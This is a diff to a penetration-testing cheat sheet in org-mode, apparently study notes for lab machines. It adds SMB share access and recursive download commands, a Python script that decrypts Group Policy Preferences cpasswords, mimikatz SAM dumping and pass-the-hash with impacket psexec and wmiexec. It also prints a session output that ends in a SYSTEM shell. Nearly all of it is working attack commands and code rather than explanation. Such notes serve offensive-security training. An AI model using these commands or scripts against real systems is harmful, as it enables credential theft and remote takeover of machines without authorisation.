@@ -438,6 +438,17 @@ nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
 smbmap -H <IP>
    #+end_example
 
+   Connect to SMB share
+   #+begin_example
+smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
+smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
+   #+end_example
+
+   download recursively entire share
+   #+begin_example
+smbget -a -R smb://active/Replication
+   #+end_example   
+   
    list share of particular user with username and password
    #+begin_example
 crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
@@ -453,10 +464,9 @@ crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
 crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
    #+end_example
 
-   Connect to SMB share
+   crawl all files
    #+begin_example
-smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
-smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
+crackmapexec smb active -u "" -p "" -M spider_plus
    #+end_example
    
 ** SNMP
@@ -1103,6 +1113,56 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
     #+end_example
    
+*** GPP (Group Policy Preferences)
+    Say you have the following
+
+    *Groups.xml*
+
+    #+begin_src xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+    #+end_src
+
+    We can crack the ~cpassword~ with the following python script
+
+    *ggp-decrypt.py*
+
+    #+begin_src python
+#!/usr/bin/env python3
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+if __name__ == "__main__":
+    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    
+    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
+    ciphertext = base64.b64decode(ciphertext)
+
+    plaintext = cipher.decrypt(ciphertext)
+    plaintext = unpad(plaintext, AES.block_size)
+
+    print(plaintext.decode())
+    #+end_src
+
+    To use the script do the following
+
+    #+begin_src bash
+python3 -m venv venv
+. venv/bin/activate
+pip3 install pycryptodome
+python3 gpp-decrypt.py
+    #+end_src
+    
+    The key was obtained directly from Microsoft. References:
+
+    - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+    - https://adsecurity.org/?p=2288
+
 ** Client-Side
 *** Email phishing attack
     First we install and enable our ~webdav~ server
@@ -1207,29 +1267,54 @@ proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
     The last two requirements are met by default settings on modern
     Windows Server Systems.
 
-    ---
+    There are different ways to exploit this.
     
-    Pass the NTLM hash of admin to get shell on remote target
-
-    - First we dump password with mimikatz
+**** Pass the NTLM hash of admin
+     1. First we dump password with mimikatz
 
       #+begin_example
  ./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump:sam"
       #+end_example
 
-    - Then we use the hash with psexec. Notice the format
-      "LMHash:NTHash", where LMHash is set to 0 because we do not use it.
+     2. Then we use the hash with psexec. Notice the format
+	"LMHash:NTHash", where LMHash is set to 0 because we do not use it.
 
-      #+begin_example
- impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
-      #+end_example
+	#+begin_example
+   impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
+	#+end_example
 
-    - Another way is to also use ~wmiexec~
+     3. Another way is to also use ~wmiexec~
 
-      #+begin_example
- impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
-      #+end_example
+	#+begin_example
+   impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
+	#+end_example
 
+**** Using impacket-psexec
+     #+begin_src bash
+impacket-psexec active.htb/administrator@10.10.10.100                                    
+     #+end_src
+
+     Example execution
+
+     #+begin_example
+impacket-psexec active.htb/administrator@10.10.10.100
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file DtfeFzTI.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service IOHP on 10.10.10.100.....
+[*] Starting service IOHP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+     #+end_example
+     
 *** WMI, winRM and evil-winrm
     First with WMI (Windows Management Instrumentation), using
     powershell. The reverse shell here was generated based on the code
